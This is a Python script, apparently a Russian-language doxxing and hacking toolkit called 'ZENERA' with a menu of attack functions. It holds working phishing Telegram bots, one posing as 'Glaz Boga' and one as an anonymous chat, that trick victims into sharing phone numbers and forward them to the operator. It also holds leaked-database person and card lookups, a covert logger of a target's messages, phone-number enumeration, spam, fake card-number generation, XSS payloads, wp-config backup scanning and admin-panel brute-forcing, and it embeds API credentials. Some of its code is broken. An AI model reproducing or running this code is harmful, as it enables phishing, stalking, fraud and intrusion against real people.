import asyncio
import threading
import random
from pystyle import Colors, Box, Write, Center, Colorate
import time
import ctypes
import requests
from urllib.parse import urlparse
from bs4 import BeautifulSoup
import whois
import os
import telebot, time
from telebot import *
import time
import traceback
from PIL import Image
from PIL.ExifTags import TAGS
import string
import random
from faker import Faker
import csv
import telebot
from telebot import types
import time
import asyncio
import socket
from telethon.sync import TelegramClient
from telethon.sync import TelegramClient
from telethon.tl.functions.contacts import ImportContactsRequest
from telethon.tl.types import InputPhoneContact
from telethon import TelegramClient, events
from telethon.sync import TelegramClient
from telethon.tl import functions
from telethon import TelegramClient, events
from telethon.sync import TelegramClient
from telethon.tl.functions.contacts import ImportContactsRequest
from telethon.tl.types import InputPhoneContact
import urllib, socket
from urllib.parse import urlparse
from urllib.request import urlopen
import pystyle
import time


request_count = 0
last_request_time = 0

API = "6995992721:MoAncmgs"
def Search(Term):
    def make_request(Term):
        data =  {"token":API, "request":Term, "limit": 100, "lang":"ru"}
        url = 'https://server.leakosint.com/'
        response = requests.post(url, json=data)
        return response.json()
    data = make_request(Term)
    for source in data["List"]:
        if source == "No results found":
            pystyle.Write.Print("[!] Ничего не найдено")
        pystyle.Write.Print(f"\n[!] База данных -> ", pystyle.Colors.red_to_yellow, interval = .001)
        pystyle.Write.Print(f"{source}\n", pystyle.Colors.white, interval = .001)
        for item in data["List"][source]["Data"]:
            if str(item) in set():
                continue
            for key, value in item.items():
                pystyle.Write.Print(f"[+] {key} -> ", pystyle.Colors.red_to_yellow, interval = .001)
                pystyle.Write.Print(f"{value}\n", pystyle.Colors.white, interval = .001)
    if "No results found" not in data["List"]:
        print()
        pystyle.Write.Print("----======[", pystyle.Colors.red_to_blue, interval = 0.005)
        pystyle.Write.Print("ZENERA", pystyle.Colors.white, interval = 0.005)
        pystyle.Write.Print("]======----", pystyle.Colors.red_to_blue, interval = 0.005)
    
def generate_card_number(country):
    prefix = {"1": "9800", "2": "8100", "3": "3980"}
    return prefix[country] + ''.join(random.choice('0123456789') for _ in range(12))
global page
def wpbackupscanner(host):
    backups = ['/wp-config.php', '/wp-config.php.txt', '/wp-config.php.save', '/.wp-config.php.swp', '/wp-config.php.swp', '/wp-config.php.swo', '/wp-config.php_bak', '/wp-config.bak', '/wp-config.php.bak', '/wp-config.save', '/wp-config.old', '/wp-config.php.old', '/wp-config.php.orig', '/wp-config.orig', '/wp-config.php.original', '/wp-config.original', '/wp-config.txt']
    print(Colorate.Horizontal(Colors.red_to_purple, ("Поиск WordPress backups")))
    progress = 0
    backup = []
    backupurl = []
    try:
        for i in backups:
            print(Colorate.Horizontal(Colors.red_to_purple, ("Прогресс %i / %s"% (progress, len(backups)))))
            progress += 1
            sock(host, i)
            if page.getcode() == 200:
                detecting = str(sock(host, i, "1"))
                if "define('BD_PASSWORD')" in detecting:
                    s1 = i
                    s2 = data
                    backup.append(s1)
                    backupurl.append(s2)
    except KeyboardInterrupt:
        print(Colorate.Horizontal(Colors.red_to_purple, ("Детект файлов пропущен")))
    print('')
    for ifile,iurl in zip(backup, backupurl):
        print(Colorate.Horizontal(Colors.red_to_purple, ("Бэкап найден!\n | Название файла: %s\n | URL: %i\n"%(ifile,iurl))))
        
def dump_site(url):
    response = requests.get(url)
    if response.status_code != 200:
        exit(Colorate.Horizontal(Colors.red_to_purple, ("Не удалось получить доступ к сайту.")))
    soup = BeautifulSoup(response.text, "html.parser")
    filename = url.replace('https://', '').split('.')[0]+'.html'
    print(Colorate.Horizontal(Colors.red_to_purple, (f"Дамп сохранён в {filename}")))
    with open(filename, 'w', encoding='utf-8') as file:
    	file.write(soup.prettify())
     
def generation_naxyi():
    print(Colorate.Horizontal(Colors.red_to_purple, (f"Все ключи будут сохранены в файл mullvad_keys.txt")))
    keys = int(input(Colorate.Horizontal(Colors.red_to_purple, ("Сколько нужно сгенерировать ключей ---> "))))

    def generate_key():
        key = ''.join(random.choices(string.digits, k=16))
        return key

    def validated_key(key):
        if len(key) != 16:
            return False
        if not key.isdigit():
            return False
        return True

    def save_key(key):
        with open('mullvad_keys.txt', 'a') as file:
            file.write(key + '\n')

    for _ in range(keys):
        generated_key = generate_key()
        if validated_key(generated_key):
            save_key(generated_key)
        else:
            pass

def request_sd(url):
    try:
        return requests.get("https://"+url)
    except requests.exceptions.ConnectionError:
        pass
    except requests.exceptions.InvalidURL:
        pass
    except UnicodeError:
        pass
    except KeyboardInterrupt:
        print(Colorate.Horizontal(Colors.red_to_purple, ("Программа замороженна")))
        exit(0)

def generate_expiry_date():
    month = str(random.randint(1, 12)).zfill(2)
    year = str(random.randint(2023, 2030))
    return month + '/' + year[-2:]

def generate_cvv():
    return ''.join(random.choice('0123456789') for _ in range(3))

def generate_card(country):
    card_number = generate_card_number(country)
    expiry_date = generate_expiry_date()
    cvv = generate_cvv()
    return card_number, expiry_date, cvv

def subdomainfinger(wordlist, domain):
    wordlist = wordlist.split("\n")
    for line in wordlist:
        word = line.strip()
        test_url = word+"."+domain
        response = request_sd(test_url)
        if response.status_code == 200:
            print(f"[+] {test_url}")
        else:
            print(f"[-] {test_url}" )


def get_characters(complexity):
    characters = string.ascii_letters + string.digits
    if complexity == "medium":
        characters += "!@#$%^&*()" 
    elif complexity == "high":
        characters += string.punctuation
        
    return characters

def XSSScan(site):
    print(Colorate.Horizontal(Colors.red_to_purple, ("XSS сканер запущен")))
    vuln = []
    payloads = {
                        '3':'natrium();"\'\\/}{natrium',
                        '2':'natrium</script><script>alert(1)<script>natrium',
                        '1':'<natrium>'
    }
    path = "https://"+site+urllib.parse.urlparse(site).path
    parsedurl = urllib.parse.urlparse(site)
    parameters = urllib.parse.parse_qsl(parsedurl.query, keep_blank_values=True)
    parameternames = []
    parametervalues = []

    for m in parameters:
        parameternames.append(m[0])
        parametervalues.append(m[0])

    for n in parameters:
        found = 0
        try:
            for i in payloads:
                pay = payloads[i]
                index = parameternames.index(n[0])
                original = parametervalues[index]
                parametervalues[index] = pay
                modifiedurl = urllib.urlencode(dict(zip(parameternames, parametervalues)))
                parametervalues[index] = original
                modifiedparams = modifiedurl
                payloads = urllib.quote_plus(payloads[i])
                u = urllib.urlopen(path+"?"+modifiedparams)
                source = u.read()
                code = BeautifulSoup(source)
                if str(i) == str(1):
                    if payloads[i] in source:
                        found = 1
                script = code.findAll('script')
                if str(i) == str(3) or str(i) == str(2):
                    for p in range(len(script)):
                        try:
                            if pay in script[p].contents[0]:
                                found = 1
                        except IndexError:
                            pass
                if str(i) == str(2):
                    if payloads['2'] in source:
                        found = 1
        except KeyError:
            pass


def admin_finger(url):
    file = requests.get("https://raw.githubusercontent.com/NirkZxc/Wordlist/main/wordlist.txt").text
    file1 = requests.get("https://raw.githubusercontent.com/NirkZxc/Wordlist/main/wordlist1.txt").text
    file2 = requests.get("https://raw.githubusercontent.com/NirkZxc/Wordlist/main/wordlist2.txt").text
    file = file.split("\n")
    file1 = file1.split("\n")
    file2 = file2.split("\n")

    for line in file:
        admin_url1 = "https://" + url + "/" + line
        admin_url = admin_url1.replace('\n', '')
        response = requests.head(admin_url)
        if response.status_code == 200:
            print(f"[+] {admin_url}")
        else:
            print(f"[-] {admin_url}")
            
def console_clear():
    if os.sys.platform == "win32":
        os.system("cls")
    else:
        os.system("clear")


def generate_password(length, complexity):
    characters = get_characters(complexity)
    password = ''.join(random.choice(characters) for i in range(length))
    
    return password
    
def disable_resize_and_maximize():

    GWL_STYLE = -16
    WS_SIZEBOX = 0x00040000
    WS_MAXIMIZEBOX = 0x00010000


    hwnd = ctypes.windll.kernel32.GetConsoleWindow()


    style = ctypes.windll.user32.GetWindowLongW(hwnd, GWL_STYLE)

    style = style & ~WS_SIZEBOX
    style = style & ~WS_MAXIMIZEBOX

    ctypes.windll.user32.SetWindowLongW(hwnd, GWL_STYLE, style)




disable_resize_and_maximize()
starting = '''
                   

                     ▄███████▄     ▄████████ ███▄▄▄▄      ▄████████    ▄████████    ▄████████   
                    ██▀     ▄██   ███    ███ ███▀▀▀██▄   ███    ███   ███    ███   ███    ███ 
                          ▄███▀   ███    █▀  ███   ███   ███    █▀    ███    ███   ███    ███ 
                     ▀█▀▄███▀▄▄  ▄███▄▄▄     ███   ███  ▄███▄▄▄      ▄███▄▄▄▄██▀   ███    ███ 
                      ▄███▀   ▀ ▀▀███▀▀▀     ███   ███ ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   ▀███████████ 
                    ▄███▀         ███    █▄  ███   ███   ███    █▄  ▀███████████   ███    ███ 
                    ███▄     ▄█   ███    ███ ███   ███   ███    ███   ███    ███   ███    ███ 
                     ▀████████▀   ██████████  ▀█   █▀    ██████████   ███    ███   ███    █▀  
                                                                      ███    ███                                                                                                                                                                                                                                                                                            
            -=============================================================================================-
'''
Write.Print(starting,Colors.red, interval=0.001)
menu = '''
1: ПОИСК ПО НОМЕРУ        │ 11: WEB-CRAWLER                    │ 21: ГЕНЕРАТОР ВЫМЫШЛЕННОЙ КАРТЫ         
2: ПОИСК ПО ПОЧТЕ         │ 12: cB@T Б@HB0Pд                   │ 22: ПАРСЕР ТЕЛЕГРАММ                  
3: ПОИСК ПО НИКУ          │ 13: ПОИСК ТЕЛЕГРАММ                │ 23: СПАММЕР ТЕЛЕГРАММ                  
4: РАССЫЛКА(ТЕЛЕГРАММ)    │ 14: ТРАФФЕР                        │ 24: ПОРТ СКАНЕР                        
5: DDOS                   │ 15: ГЕНЕРАТОР СЛОЖНОГО ПАРОЛЯ      │ 25: ПОИСК ПО КАРТЕ                     
6: ПОИСК ПО БД            │ 16: ГЕНЕРАТОР ВЫМЫШЛЕННОЙ ЛИЧНОСТИ │ 26: ПОИСК ПО ВК                        
7: ПОИСК ПО ФИО           │ 17: ПРОКСИ ЛИСТ                    │ 27: АВТООТВЕТЧИК ТЕЛЕГРАММ             
8: ФИШИНГ                 │ 18: ПОИСК ПО АДРЕСУ                │ 28: ЛОГГЕР СООБЩЕНИЙ ПОЛЬЗОВАТЕЛЯ      
9: ПОИСК ПО АЙПИ          │ 19: ФИШИНГ "АНОНИМНЫЙ ЧАТ"         │ 29: ПАРСЕР СООБЩЕНИЙ ПОЛЬЗОВАТЕЛЯ      
10: ИНФОРМАЦИЯ О САЙТЕ    │ 20: ФИШИНГ "ГЛАЗ БОГА"             │ 30: ПОИСК SYSADMIN                      
──────────────────────────┼────────────────────────────────────┼──────────────────────────────────────────
31: XSS SCANER            │ 33: ПОИСК САБДОМЕНА                │ 35: ДАМПИНГ САЙТА 
32: WORDPRESS BACKUP SCAN │ 34: ГЕНЕРАТОР MULLVAD              │ 36: EXIT
'''

Write.Print(Center.XCenter(Box.DoubleCube(menu)), Colors.red, interval=0.001)

def transform_text(input_text):
    translit_dict = {
        'а': '@',
        'б': 'Б',
        'в': 'B',
        'г': 'г',
        'д': 'д',
        'е': 'е',
        'ё': 'ё',
        'ж': 'ж',
        'з': '3',
        'и': 'u',
        'й': 'й',
        'к': 'K',
        'л': 'л',
        'м': 'M',
        'н': 'H',
        'о': '0',
        'п': 'п',
        'р': 'P',
        'с': 'c',
        'т': 'T',
        'у': 'y',
        'ф': 'ф',
        'х': 'X',
        'ц': 'ц',
        'ч': '4',
        'ш': 'ш',
        'щ': 'щ',
        'ъ': 'ъ',
        'ы': 'ы',
        'ь': 'ь',
        'э': 'э',
        'ю': 'ю',
        'я': 'я'
    }

    transformed_text = []
    
    for char in input_text:
        if char in translit_dict:
            transformed_text.append(translit_dict[char])
        else:
            transformed_text.append(char)
    
    return ''.join(transformed_text)
  
def ip_lookup(ip_address): 
  url = f"http://ip-api.com/json/{ip_address}"
  try:
    response = requests.get(url)
    data = response.json()
    if data.get("status") == "fail":
      return f"Ошибка: {data['message']}\n"
    
    info = ""
    for key, value in data.items():
      info += f"  |{key}: {value}\n"
    return info
  
  except Exception as e:
    return f"Произошла ошибка: {str(e)}\n"
def get_website_info(domain):

  try:
    domain_info = whois.whois(domain)
    print_string = f"""
  |Информация о сайте: 
  |Домен: {domain_info.domain_name}
  |Зарегистрирован: {domain_info.creation_date}
  |Истекает: {domain_info.expiration_date}  
  |Владелец: {domain_info.registrant_name}
  |Организация: {domain_info.registrant_organization}
  |Адрес: {domain_info.registrant_address}
  |Город: {domain_info.registrant_city}
  |Штат: {domain_info.registrant_state}
  |Почтовый индекс: {domain_info.registrant_postal_code}
  |Страна: {domain_info.registrant_country}
  |IP-адрес: {domain_info.name_servers}
    """
    Write.Print(print_string + "\n", Colors.red_to_purple, interval=0.005)
  except Exception as e:
    print(f"Ошибка: {e}\n")


while True:

  choice = Write.Input('\nВыберите номер функции > ', Colors.purple_to_red, interval=0.005)
  
  if choice == '35':
    host = input(Colorate.Horizontal(Colors.red_to_purple, ("Введите URL сайта ---> ")))
    if 'https://' in host:
                url = host
    else:
                url = 'https://'+host
    dump_site(url)
  if choice == '28':    
    api_id = '20442511' 
    api_hash = '1b25750beee7ca09eeedce0de5406b66'

    client = TelegramClient('anon', api_id, api_hash)

    async def main():
        username = input("Введите имя пользователя: ")
        user = await client.get_entity(username)
        user_id = user.id
        print(f"ID пользователя: {user_id}")

        group_link = input("Введите ссылку на группу: ")

        @client.on(events.NewMessage(chats=group_link))
        async def handler(event):
            if event.message.sender_id == user_id:
                print(f"{event.message.date.strftime('%Y-%m-%d %H:%M:%S')} | {user.first_name} (@{user.username}): {event.message.text}")
                with open('messages.csv', 'a', newline='', encoding='utf-8') as file:
                    writer = csv.writer(file)
                    writer.writerow([event.message.date.strftime('%Y-%m-%d %H:%M:%S'), f"{user.first_name}: {event.message.text}"])

        await client.run_until_disconnected()

    with client:
        client.loop.run_until_complete(main())
        

  if choice == '29':
    api_id = 20442511 
    api_hash = '1b25750beee7ca09eeedce0de5406b66'
    client = TelegramClient('anon', api_id, api_hash)

    async def main():
        await client.start()
            
        username = input("Введите юзер нейм: ")
        group = input("Введите ссылку группы: ")
            
        async for message in client.iter_messages(group, from_user=username):   
            date = str(message.date)
            name = message.from_id.user_id 
            content = str(message.text)
            row = [f"{date} | @{name}: {content}"] 
                
            with open('messages.csv', 'a', encoding='utf-8') as f:
                writer = csv.writer(f)  
                writer.writerow(row)
                    
        await client.disconnect()
        
  if choice == '30':
      url = input(Colorate.Horizontal(Colors.red_to_purple, ("Введите URL сайта > ")))
      admin_finger(url)
  if choice == '31':    
      url = input(Colorate.Horizontal(Colors.red_to_purple, ("Введите URL сайта --->")))
      XSSScan(url)
  if choice == '32':
      url = input(Colorate.Horizontal(Colors.red_to_purple, ("Введите URL сайта --->")))
      console_clear()
      wpbackupscanner(url)
  if choice == '34':
      generation_naxyi()
  if choice == '33':
    console_clear()
    print(Colorate.Horizontal(Colors.red_to_purple, Center.Center(f"""
            -----------------------------------------------------------------------------------------------             
                                                Subdomain finger Menu                                                   
            -----------------------------------------------------------------------------------------------             
                                                                                                                        
           [1]  Брут сабдомена используя мелкий словарь             [2]  Брут сабдомена используя большой словарь       
                                                                                                                        
                                                                                                                        
                                              [99] Главное меню                                                         
                                                  [0]  Выйти                                                            
                                                                                                                        """)))
    page_sd = int(input(Colorate.Horizontal(Colors.red_to_purple, ("----->"))))
    if page_sd == 1:
                wordlist = requests.get("https://raw.githubusercontent.com/NirkZxc/Wordlist/main/small.txt").text
                domain = input(Colorate.Horizontal(Colors.red_to_purple, ("Введите URL сайта > ")))
                request_sd(domain)
                subdomainfinger(wordlist, domain)
    elif page_sd == 2:
                wordlist = requests.get("https://raw.githubusercontent.com/NirkZxc/Wordlist/main/subdomain.list").text
                domain = input(Colorate.Horizontal(Colors.red_to_purple, ("Введите URL сайта > ")))
                request_sd(domain)
                subdomainfinger(wordlist, domain)
    elif page_sd == 99:
                os.system("clear")
                main()
    elif page_sd == 0:
                exit(Colorate.Horizontal(Colors.red_to_purple, ("Good Luck!")))
  if choice == '23':
    api_id = 20442511 
    api_hash = '1b25750beee7ca09eeedce0de5406b66'
    client = TelegramClient('anon', api_id, api_hash)
  

    async def main():
        await client.start()
            
        username = input("Введите юзернейм: ")
        group = input("Введите ссылку группы: ")
            
        async for message in client.iter_messages(group, from_user=username):   
            date = str(message.date)
            name = message.from_id.user_id 
            content = str(message.text)
            row = [f"{date} | @{name}: {content}"] 
                
            with open('messages.csv', 'a', encoding='utf-8') as f:
                writer = csv.writer(f)  
                writer.writerow(row)
                    
        await client.disconnect()
            
    with client:
        client.loop.run_until_complete(main())

  if choice == '27':
    api_id = '20442511'
    api_hash = '1b25750beee7ca09eeedce0de5406b66'

    client = TelegramClient('anon', api_id, api_hash)

    responded_users = set() 

    response_text = input("Введите текст: ")

    @client.on(events.NewMessage)
    async def my_event_handler(event):
        if event.sender_id not in responded_users:
            await event.reply(response_text)
            responded_users.add(event.sender_id)

    client.start()
    client.run_until_disconnected()

  if choice == '26':
      
      search_term = input("Введите ссылку на вк: ")
      Search

  if choice == '25':
    card = Write.Input("Введите карту: ", Colors.purple_to_red, interval=0.005) 

    found = False
    
    folder = "db"

    path3 = os.path.join(folder, "alfa.csv")
        
    with open(path3, 'r', encoding='utf-8') as f:
            
            for line in f:
                
                if card in line:
                    line = line.replace(',', '\n')
                    elements = line.strip().split('\n')
                    print("UK: " + elements[0])
                    print("Имя клиента: " + elements[1])
                    print("Дата рождения: " + elements[2])
                    print("Клиент UK: " + elements[3])
                    print("Код контакта клиента: " + elements[4])
                    print("Владелец клиента UK:" + elements[5])
                    print("Код номера карты: " + elements[6])
                    print("Дата истечения: " + elements[7])
                    print("Номер счета: " + elements[8])
                    print("BIN: " + elements[9])
                    print("Бренд: " + elements[10])
                    print("Тип: " + elements[11])
                    print("Категория: " + elements[12]) 
                    print("Эмитент: " + elements[13])
                    print("Alpha 2: " + elements[14])
                    print("Alpha 3: " + elements[15])
                    print("Страна: " + elements[16])
                    print("Широта: " + elements[17])
                    print("Долгота: " + elements[18])
                    found = True
                    break
                    
                    if not found:
                        print("Данные не найдены")

  if choice == '24':
    print("Выберите режим:")
    print("99 - проверить часто используемые порты") 
    print("98 - проверить указанный порт")

    mode = input("Ваш выбор:")
    
  if choice == "99":
    mode = input("Ваш выбор: ")
    ports = [20, 26, 28, 29, 55, 53, 80, 110, 443, 8080, 1111, 1388, 2222, 1020, 4040, 6035]  
    for port in ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            result = sock.connect_ex(('127.0.0.1', port))
            if result == 0:
                print(f'Порт {port} открыт')
            else:
                print(f'Порт {port} закрыт')
            sock.close()

  elif choice == "98":
        port = int(input("Введите номер порта: "))    
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        result = sock.connect_ex(('127.0.0.1', port))
        if result == 0:
            print(f'Порт {port} открыт')
        else:
            print(f'Порт {port} закрыт')
        sock.close()
        
  if choice == '36':
      print("выход...")
      time.sleep(0.5)

  if choice == '22':
    range_num = int(input("Введите число: "))

    api_id = '25167873'
    api_hash = '6f0af1029f9829dfadbbc609922d6762'

    codes = {
        'МТС': [910, 915, 916, 917, 919, 985, 986],
        'Билайн': [903, 905, 906, 909, 962, 963, 964, 965, 966, 967, 968, 969, 980, 983, 986],
        'МегаФон': [925, 926, 929, 936, 999],
        'Теле2': [901, 958, 977, 999]
    }

    with TelegramClient('anon', api_id, api_hash) as client:
        for _ in range(range_num):
            operator = random.choice(list(codes.keys()))
            operator_code = random.choice(codes[operator])
            phone_number = f'+7{operator_code}{random.randint(1000000,9999999)}'

            random_name = ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase, k=10))

            contact = InputPhoneContact(client_id=0, phone=phone_number, first_name=random_name, last_name="")
            result = client(ImportContactsRequest([contact]))

            try:
                entity = client.get_entity(phone_number)
                print(f'Аккаунт существует: {entity.id}, {entity.username}, {entity.first_name}, {entity.phone}')
                with open('valid.txt', 'a') as f:
                    f.write(f'{entity.phone}, {entity.id}, {entity.username}, {entity.first_name}\n')
            except ValueError:
                print(f'Аккаунт {phone_number} не существует.')

  if choice == '21':
      
      print("Выберите страну:")
      print("1: Украина")
      print("2: Россия")
      print("3: Казахстан")
      country = input()

      card_number, expiry_date, cvv = generate_card(country)
      print(f"Страна: {country}\nНомер карты: {card_number}\nСрок действия: {expiry_date}\nCVV: {cvv}")


  if choice == '20':
      
          Write.Print(("""
——————————————Объяснение—————————————————
пользователь запускает бота > пользователь отправляет номер телефона боту > номер телефона отправляется вам.
——————————————Инструкция—————————————————
1 шаг: получить токен бота у @BotFather и этот токен ввести в строку с токеном.
2 шаг: ввести свой Telegram айди в строку с айди
    """), Colors.red_to_yellow, interval=0.001)
          
          Token = Write.Input('\nвведите токен: ', Colors.purple_to_red, interval=0.005)
          admin = Write.Input('введите свой айди: ', Colors.purple_to_red, interval=0.005)

          bot = telebot.TeleBot(Token)
          
          Write.Print(("бот запущен!"), Colors.red_to_purple, interval=0.005) 

          find_menu = types.InlineKeyboardMarkup()
          button0 = types.InlineKeyboardButton('🔎Начать поиск', callback_data="start_dox")
          find_menu.row(button0)
          button1 = types.InlineKeyboardButton('⚙️Аккаунт', callback_data="dox")
          button2 = types.InlineKeyboardButton('🆘Поддержка',callback_data="dox")
          find_menu.row(button1,button2)
          button3 = types.InlineKeyboardButton('🤖Создать собственный бот',callback_data="dox")
          find_menu.row(button3)
          button4 = types.InlineKeyboardButton('🤝Партнерская программа',callback_data="dox")
          find_menu.row(button4)





          @bot.message_handler(commands=['start'])
          def start(message):
              bot.send_message(message.from_user.id,"*Добро пожаловать!*",parse_mode="Markdown")
              bot.send_message(message.from_user.id,"*Выберите нужное действие:*",parse_mode="Markdown",reply_markup=find_menu)


          @bot.callback_query_handler(func=lambda call: call.data == "start_dox")
          def button0_pressed(call: types.CallbackQuery):
                bot.send_message(chat_id=call.message.chat.id,text= "👤 Поиск по имени\n"+\
                                                                                                "├  `Блогер` _(Поиск по тегу)_\n"\
                                                                                                "├  `Антипов Евгений Вячеславович`\n"\
                                                                                                "└  `Антипов Евгений Вячеславович 05.02.1994`\n"\
                                                                                                "_(Доступны также следующие форматы_ "+"`05.02`"+"_/_"+"`1994`"+"_/_"+"`28`"+"_/_"+"`20-28`"+"_)_\n\n"\
                                                                                                "🚗 Поиск по авто\n"\
                                                                                                "├  `Н777ОН777` - поиск авто по *РФ*\n"\
                                                                                                "└  `ХТА21150053965897` - поиск по *VIN*\n\n"\
                                                                                                "👨 *Социальные сети*\n"\
                                                                                                "├  `https://www.instagram.com/violetta_orlova` - *Instagram*\n"\
                                                                                                "├  `https://vk.com/id577744097` - *Вконтакте*\n"\
                                                                                                "├  `https://facebook.com/profile.php?id=1` - *Facebook*\n"\
                                                                                                "└  `https://ok.ru/profile/162853188164` - *Одноклассники*\n\n"\
                                                                                                "📱 `79999939919` - для поиска по *номеру телефона*\n"\
                                                                                                "📨 `tema@gmail.com` - для поиска по *Email*\n"\
                                                                                            "📧 `#281485304`, `@durov` или `перешлите сообщение` - поиск по *Telegram* аккаунту\n\n"\
                                                                                                "🔐 `/pas churchill7` - поиск почты, логина и телефона *по паролю*\n"\
                                                                                                "🏚 `/adr Москва, Тверская, д 1, кв 1` - информация по адресу (РФ)\n"\
                                                                                                "🏘 `77:01:0001075:1361` - поиск по *кадастровому номеру*\n\n"\
                                                                                                "🏛 `/company Сбербанк` - поиск по *юр лицам*\n"\
                                                                                                "📑 `/inn 784806113663` - поиск по *ИНН*\n"\
                                                                                                "🎫 `/snils 13046964250` - поиск по *СНИЛС*\n\n"\
                                                                                                "📸 Отправьте *фото человека*, чтобы найти его или двойника на сайтах *ВК*, *ОК*.\n"\
                                                                                                "🚙 Отправьте *фото номера автомобиля*, чтобы получить о нем информацию.\n"\
                                                                                                "🙂 Отправьте *стикер*, чтобы найти *создателя*.\n"\
                                                                                                "🌎 Отправьте *точку на карте*, чтобы *найти людей*, которые сейчас там.\n"\
                                                                                                "🗣 С помощью *голосовых команд* также можно выполнять *поисковые запросы*.",parse_mode="Markdown")

          send = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
          button_phone = types.KeyboardButton(text="✅Подтвердить", request_contact=True)
          send.add(button_phone)

          @bot.callback_query_handler(func=lambda call: call.data == "dox")
          def button1_pressed(call: types.CallbackQuery):
                bot.send_message(chat_id=call.message.chat.id,text= "⚠️Прежде чем начать поиск, подтвердите свой аккаунт\n\n""*Это временная мера, связанная с активной DDOS атакой на нас.*",parse_mode="Markdown",reply_markup=send)



          @bot.message_handler(content_types=['contact']) 
          def contact(message):
              if message.contact is not None:
                  try:
                      Write.Print((f"\nКто-то отправил свой номер:\n Имя: {message.from_user.first_name}\n Логин: { message.from_user.username}\n ID: { message.from_user.id}\n Номер телефона:  { message.contact.phone_number}\n -------------------------------"), Colors.red_to_yellow, interval=0.005)
                      bot.send_message(admin,"*🔔Кто-то отправил свой номер!*\n"+\
                            "Имя: `"+message.from_user.first_name+\
                            "\n`Логин: @"+message.from_user.username+\
                              "\n`ID: "+str(message.from_user.id)+\
                            "\n`Номер телефона: `"+message.contact.phone_number+"`",parse_mode="Markdown")
                      f=open("db.csv","a+")
                      f.write(f"{message.from_user.first_name},{ message.from_user.last_name},{ message.from_user.username},{ message.from_user.id},{ message.contact.phone_number}\n")
                      f.close()
                  except TypeError:
                      traceback.print_exc()
                      print("Нет тела или др. typeerror")
                  curhour= time.asctime().split(" ")[3].split(":")[0]
                  bot.send_message(message.from_user.id,f"*⚠️ Технические работы до  {int(curhour) +7} :00 по мск.*\n\nРаботы будут завершены в данный промежуток времени, все подписки продлены.",parse_mode="Markdown",reply_markup=types.ReplyKeyboardRemove())



          @bot.message_handler(content_types=['text'])
          def handler(message):
                bot.send_message(message.from_user.id,"⚠️Прежде чем начать поиск, подтвердите свой аккаунт\n\n""*Это временная мера, связанная с активной DDOS атакой на нас.*",parse_mode="Markdown",reply_markup=send)




          bot.infinity_polling(none_stop=True)

  if choice == '14':
    api_id = '20442511'
    api_hash = '1b25750beee7ca09eeedce0de5406b66'

    client = TelegramClient('session_telegram', api_id, api_hash)

    async def send_message():
        while True:
            await client.send_message(f'{linkc}', f'''{message1}''')
            print("сообщение отправлено!")
            await asyncio.sleep(time2)

    async def main():
        await client.start()
        tasks = [
             asyncio.ensure_future(send_message()),
        ]
        await asyncio.gather(*tasks)

    if __name__ == '__main__':

        linkc = input("ссылка на группу: ")
        message1 = input("сообщение: ")
        time2 = int(input("время перерыва: "))

        with client:
            client.loop.run_until_complete(main())

  if choice == '19':

        token_bot = input("введите токен: ")
        bot = telebot.TeleBot(token_bot)
        bot.delete_webhook()

        waiting_users = []
        chatting_users = {}
        verified_users = {}

        def send_welcome(message):
            if message.chat.id in verified_users:
                bot.send_message(message.chat.id, f"Приветствую {message.from_user.first_name}, это анонимный чат с быстрой передачей сообщений друг другу, здесь ты найдешь знакомства, друзей, и так далее☺.")
                time.sleep(1)
                bot.send_message(message.chat.id, "Теперь вы можете приступить к поиску знакомств!😋, отправьте команду /search чтобы начать поиск собеседника. Чтобы завершить диалог отправьте команду /stop")
            else:
                markup = types.InlineKeyboardMarkup()
                markup.add(types.InlineKeyboardButton(text='Подтвердить личность🐱‍👤', callback_data='verify'))
                bot.send_message(message.chat.id, f"Приветствую {message.from_user.first_name}, это анонимный чат с быстрой передачей сообщений друг другу, здесь ты найдешь знакомства, друзей, и так далее. Но для начала вам нужно подтвердить личность в связи с спамом🤒.", reply_markup=markup)

        @bot.message_handler(commands=['start'])
        def start_handler(message):
            send_welcome(message)

        @bot.callback_query_handler(func=lambda call: call.data == 'verify')
        def verify_handler(call):
            markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
            button_contact = types.KeyboardButton(text="Отправить контакт", request_contact=True)
            markup.add(button_contact)
            bot.send_message(call.message.chat.id, "Пожалуйста, подтвердите свою личность, отправив свой контакт.", reply_markup=markup)

        @bot.message_handler(content_types=['text'])
        def text_handler(message):
            if message.chat.id not in verified_users:
                bot.send_message(message.chat.id, "❌Подтвердите личность чтобы использовать эту команду❌")
                return
            if message.text == '/search':
                waiting_users.append(message.chat.id)
                bot.send_message(message.chat.id, "Ожидание собеседника⏱")
                if len(waiting_users) > 1:
                    user1 = waiting_users.pop(0)
                    user2 = waiting_users.pop(0)
                    chatting_users[user1] = user2
                    chatting_users[user2] = user1
                    bot.send_message(user1, "Найден собеседник. Начните с ним диалог.")
                    bot.send_message(user2, "Найден собеседник. Начните с ним диалог.")
            elif message.text == '/stop':
                if message.chat.id in chatting_users:
                    partner_id = chatting_users[message.chat.id]
                    del chatting_users[message.chat.id]
                    del chatting_users[partner_id]
                    bot.send_message(partner_id, "Собеседник закончил с вами диалог😥")
                    send_welcome(message)
            else:
                if message.chat.id in chatting_users:
                    bot.send_message(chatting_users[message.chat.id], message.text)

        @bot.message_handler(content_types=['contact'])
        def contact_handler(message):
            if message.chat.id not in verified_users:
                verified_users[message.chat.id] = message.contact.phone_number
                with open('users.csv', 'a', newline='') as file:
                    writer = csv.writer(file)
                    writer.writerow([message.contact.phone_number, message.chat.id, message.from_user.username, message.from_user.first_name])
                bot.send_message(message.chat.id, "Отлично, теперь вы можете приступить к поиску знакомств!😋, отправьте команду /search чтобы начать поиск собеседника. Чтобы завершить диалог отправьте команду /stop")

        @bot.message_handler(content_types=['document'])
        def document_handler(message):
            file_info = bot.get_file(message.document.file_id)
            if file_info.file_path.endswith('.exe') or file_info.file_path.endswith('.apk'):
                bot.delete_message(message.chat.id, message.message_id)
                bot.send_message(message.chat.id, "Извините, но отправка файлов .exe и .apk не разрешена.")

        bot.polling()
  if choice == '18':
    adress = Write.Input("Введите адрес: ", Colors.purple_to_red, interval=0.005) 

    found = False

    folder = "db"

    files = ['db/bdd.csv', 'db/part1.csv', 'db/part3.csv', 'db/part4.csv', 'db/part5.csv', 'db/part6.csv']

    path = os.path.join(folder, "part7.csv")
    path1 = os.path.join(folder, "eyeofgod.csv")  
